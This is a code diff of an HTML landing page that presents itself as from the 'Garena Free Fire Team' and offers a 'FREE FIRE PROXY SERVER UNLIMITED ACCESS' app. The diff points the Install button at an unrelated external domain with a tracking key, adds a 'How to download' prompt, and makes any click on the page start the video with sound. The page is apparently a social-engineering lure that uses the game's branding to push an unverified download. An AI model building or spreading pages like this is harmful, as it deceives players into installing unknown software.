@@ -22,40 +22,27 @@ body {
 
 .title {
     text-align: center;
-    margin: 25px 0;
+    margin: 25px 0 10px;
     font-size: 26px;
 }
 
-/* VIDEO BOX */
+.subtitle {
+    text-align: center;
+    font-size: 16px;
+    color: #ccc;
+}
+
+/* VIDEO */
 .video-box {
     margin: 20px;
     border: 2px solid cyan;
     border-radius: 20px;
     box-shadow: 0 0 20px purple;
     overflow: hidden;
-    position: relative;
 }
 
 video {
     width: 100%;
-    display: block;
-}
-
-/* PLAY BUTTON */
-.play-btn {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background: limegreen;
-    width: 70px;
-    height: 70px;
-    border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 30px;
-    cursor: pointer;
 }
 
 /* CARD */
@@ -110,23 +97,20 @@ video {
 <div class="header">Garena Free Fire Team</div>
 
 <div class="title">WATCH FULL VIDEO</div>
+<div class="subtitle">How to download 👇</div>
 
-<!-- VIDEO SECTION -->
 <div class="video-box">
-    <video id="myVideo" playsinline>
-        <source src="video.mp4" type="video/mp4">
+    <video id="myVideo" autoplay muted playsinline>
+        <source src="video.MP4" type="video/mp4">
     </video>
-
-    <div class="play-btn" onclick="playVideo()">▶</div>
 </div>
 
-<!-- CARD SECTION -->
 <div class="card">
     <span class="badge new">NEW</span>
     <span class="badge premium">PREMIUM</span>
 
     <div class="app">
-        <img src="https://via.placeholder.com/100" alt="app">
+        <img src="https://via.placeholder.com/100">
         <div>
             <h3>PROXY SERVER</h3>
             <p>FREE FIRE PROXY SERVER UNLIMITED ACCESS</p>
@@ -134,15 +118,18 @@ video {
         </div>
     </div>
 
-    <a href="#" class="install">⬇ Install</a>
+    <!-- INSTALL BUTTON WITH YOUR LINK -->
+    <a href="https://tlytmm.qdmmv.site?key=tlytmm72" class="install">
+        ⬇ Install
+    </a>
 </div>
 
 <script>
-function playVideo() {
+document.addEventListener("click", function () {
     let video = document.getElementById("myVideo");
+    video.muted = false;
     video.play();
-    document.querySelector(".play-btn").style.display = "none";
-}
+});
 </script>
 
 </body>
